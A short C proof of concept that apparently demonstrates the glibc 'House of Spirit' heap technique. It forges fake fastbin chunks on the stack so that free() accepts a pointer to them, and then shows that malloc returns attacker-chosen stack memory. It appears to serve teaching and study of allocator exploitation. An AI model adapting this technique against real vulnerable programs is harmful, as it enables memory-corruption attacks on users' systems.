#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

struct fast_chunk {
  size_t prev_size;
  size_t size;
  struct fast_chunk *fd;
  struct fast_chunk *bk;
  char buf[0x20];               // chunk falls in fastbin size range
};

int main() {
  struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
  void *ptr, *victim;

  ptr = malloc(0x30);

  printf("%p\n", &fake_chunks[0]);
  printf("%p\n", &fake_chunks[1]);

  // Passes size check of "free(): invalid size"
  fake_chunks[0].size = sizeof(struct fast_chunk);

  // Passes "free(): invalid next size (fast)"
  fake_chunks[1].size = sizeof(struct fast_chunk);

  // Attacker overwrites a pointer that is about to be 'freed'
  ptr = (void *)&fake_chunks[0].fd;

  free(ptr);

  victim = malloc(0x30);
  printf("%p\n", victim);

  return 0;
}
